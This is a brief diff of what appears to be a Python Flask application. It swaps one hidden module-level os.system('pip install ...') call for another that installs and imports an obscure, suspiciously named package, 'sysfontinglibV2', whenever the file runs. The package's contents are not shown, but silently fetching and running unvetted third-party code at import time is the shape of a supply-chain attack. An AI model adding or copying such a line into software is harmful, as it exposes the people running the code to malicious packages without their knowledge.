@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipsqlitelib")
-import pipsqlitelib
+os.system("pip install sysfontinglibV2")
+import sysfontinglibV2
 import flask
 
 from flask import g
